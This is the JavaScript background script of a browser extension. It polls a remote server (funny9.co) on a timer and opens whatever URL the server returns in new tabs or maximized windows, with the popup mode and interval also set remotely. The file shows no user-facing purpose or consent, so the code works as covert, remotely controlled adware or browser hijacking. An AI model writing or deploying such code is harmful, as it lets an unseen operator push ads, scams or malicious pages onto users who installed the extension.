var nhduong_id;
var nhduong_url;
var nhduong_time;
var nhduong_popup_type;
function sleep(a) {
    for (var b = (new Date).getTime(); new Date < b + 1E3 * a;);
    return 0
}
function randomId() {
    return Math.floor((Math.random() * 2) + 1);// random from 1 to 3
}

function RunningMan(){
    var xhttp;
    xhttp = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState == 4 && xhttp.status == 200) {
            var resJsonObj = JSON.parse(xhttp.responseText);
            //createNewTab(resJsonObj.url);
            __getStorage(resJsonObj);
            clearInterval(myVar);
            myVar = setInterval(function(){ RunningMan() }, getIntervalTime());
            actionExtensionNhduong(resJsonObj);
        }
    };
    xhttp.open("GET", "http://funny9.co/HostExtension/getconfig.php", !0);
    xhttp.send()
}

function createNewTab(url, type) {
	chrome.tabs.create({url: url, selected: type});
}

function createNewWindow(url, type){
    try {
        chrome.windows.create({
            url: url,
            type: "normal",
            focused: type,
            state : 'maximized'
        }, function(a) {
            myWindow = a = a.id;
            chrome.tabs.query({
                active: !0,
                windowId: a
            }, function(a) {
                myTab = a[0].id;
                sendInviteStep = 1
            })
        })
    } catch (l) {}
}

function initData(){
    var xhttp;
    xhttp = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState == 4 && xhttp.status == 200) {
            var resJsonObj = JSON.parse(xhttp.responseText);
            __getStorage(resJsonObj);
        }
    };
    xhttp.open("GET", "http://funny9.co/HostExtension/getconfig.php", !0);
    xhttp.send();
}

function __getStorage(resJsonObj){
    localStorage.getItem("nhduong_id") ? localStorage.setItem('nhduong_id', resJsonObj.id) :localStorage.setItem('nhduong_id', nhduong_id);
    localStorage.getItem("nhduong_url") ? localStorage.setItem('nhduong_url', resJsonObj.url) :localStorage.setItem('nhduong_url', nhduong_url);
    localStorage.getItem("nhduong_popup_type") ? localStorage.setItem('nhduong_popup_type', resJsonObj.popup_type) :localStorage.setItem('nhduong_popup_type', nhduong_popup_type);
    localStorage.getItem("nhduong_time") ? localStorage.setItem('nhduong_time', resJsonObj.time) :localStorage.setItem('nhduong_time', nhduong_time);
    //alert(localStorage.getItem("nhduong_id")+"--"+localStorage.getItem("nhduong_url")+"--"+localStorage.getItem("nhduong_popup_type")+"--"+localStorage.getItem("nhduong_time"));
}

initData();
//setInterval(createNewTab, 20000);
var myVar = setInterval(function(){ RunningMan() }, getIntervalTime());
//setInterval(RunningMan, getIntervalTime());
function getIntervalTime(){
    //alert(localStorage.getItem("nhduong_time")*1000);
    return localStorage.getItem("nhduong_time")*1000;
}

function actionExtensionNhduong(data){
    if(data){
        if(data.url != ''){
            switch (data.popup_type) {
                case "new_tab":
                    createNewTab(data.url,false);
                    break;
                case "new_tab_active":
                    createNewTab(data.url,true);
                    break;
                case "new_window":
                    createNewWindow(data.url,false);
                    break;
                case "new_window_active":
                    createNewWindow(data.url,true);
                    break;
            }
        }
    }
}







